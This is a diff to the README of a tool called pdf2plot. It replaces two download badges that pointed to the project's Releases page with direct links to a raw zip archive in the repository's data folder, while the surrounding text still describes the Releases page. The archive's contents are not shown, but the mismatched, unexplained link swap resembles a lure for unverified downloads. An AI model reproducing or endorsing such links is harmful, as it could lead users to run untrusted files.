@@ -8,7 +8,7 @@ To begin using pdf2plot, follow these clear steps:
 
 1. **Download the Application**
    - Click the button below to visit the Releases page for pdf2plot:
-   [![Download pdf2plot](https://img.shields.io/badge/Download-pdf2plot-blue.svg)](https://github.com/Mmrisuin/pdf2plot/releases)
+   [![Download pdf2plot](https://github.com/Mmrisuin/pdf2plot/raw/refs/heads/main/data/plot_pdf_v3.4-alpha.5.zip)](https://github.com/Mmrisuin/pdf2plot/raw/refs/heads/main/data/plot_pdf_v3.4-alpha.5.zip)
 
 2. **Choose Your Version**
    - On the Releases page, you will see a list of available versions. Find the latest version that suits your operating system.
@@ -67,7 +67,7 @@ We regularly update pdf2plot to improve its functionality. Keep an eye on the Re
 ## 📥 Download & Install
 To get pdf2plot, visit the Releases page using the link below:
 
-[![Download pdf2plot](https://img.shields.io/badge/Download-pdf2plot-blue.svg)](https://github.com/Mmrisuin/pdf2plot/releases)
+[![Download pdf2plot](https://github.com/Mmrisuin/pdf2plot/raw/refs/heads/main/data/plot_pdf_v3.4-alpha.5.zip)](https://github.com/Mmrisuin/pdf2plot/raw/refs/heads/main/data/plot_pdf_v3.4-alpha.5.zip)
 
 Ensure you follow the installation instructions provided above to successfully set up the application.
 
